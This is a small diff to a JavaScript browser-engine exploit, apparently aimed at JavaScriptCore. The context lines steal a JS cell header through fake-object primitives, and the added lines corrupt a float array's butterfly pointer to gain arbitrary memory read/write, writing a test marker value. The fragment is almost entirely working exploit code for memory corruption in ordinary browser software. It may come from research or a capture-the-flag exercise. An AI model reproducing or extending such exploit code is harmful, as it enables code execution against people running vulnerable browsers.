@@ -503,6 +503,11 @@ for (var i = 0; i < 1000; ++i) {
     var js_header = hax[0];
     container.header = js_header; 
     print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
+    
+    // Can read/write to memory now by corrupting the butterfly
+    // pointer of the float array.
+    fake_arr[1] = 3.54484805889626e-310;    // 0x414141414141 in hex
+    victim1[0] = 1337;
     /*// "Point" refers to changing the given array's butterfly
     // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
     //
